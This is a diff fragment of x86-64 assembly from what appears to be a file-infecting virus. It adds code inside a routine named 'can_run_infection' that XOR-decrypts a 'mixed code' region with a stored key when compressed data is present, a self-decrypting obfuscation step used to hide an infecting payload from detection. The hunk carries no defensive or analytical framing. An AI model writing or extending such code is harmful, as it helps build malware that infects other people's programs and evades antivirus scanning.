@@ -118,6 +118,15 @@ can_run_infection:
 	jmp .begin_mixed_code				; goto .begin_mixed_code
 
 	.valid:
+		mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
+		cmp rax, 0x0					; ...
+		je .end						; 	goto .end;
+		lea rdi, [rel .begin_mixed_code]		; _data = &.begin_mixed_code;
+		mov rsi, .end_mixed_code - .begin_mixed_code	;_size = .end_mixed_code - .begin_mixed_code;
+		lea rdx, [rel magic_key]			; _key = &magic_key;
+		mov rcx, magic_key_size				; _key_size = magic_key_size;
+		call xor_cipher					; xor_cipher(_data, _size, _key, _key_size);
+	.end:
 		mov rax, 1					; return 1;
 		ret
 
